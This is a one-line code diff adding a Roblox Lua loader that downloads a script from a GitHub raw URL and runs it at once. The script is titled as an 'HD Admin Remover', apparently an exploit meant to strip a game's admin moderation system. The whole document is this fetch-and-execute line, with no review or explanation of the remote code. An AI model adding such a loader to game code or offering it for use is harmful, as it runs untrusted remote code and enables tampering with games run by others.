@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WafflesCordDevelopmentTeam/HD-Admin-Remover-/refs/heads/main/(REWRITTEN%20AGAIN)%20HD%20Admin%20Remover%20Premium%20Version%20(kinda).lua",true))()
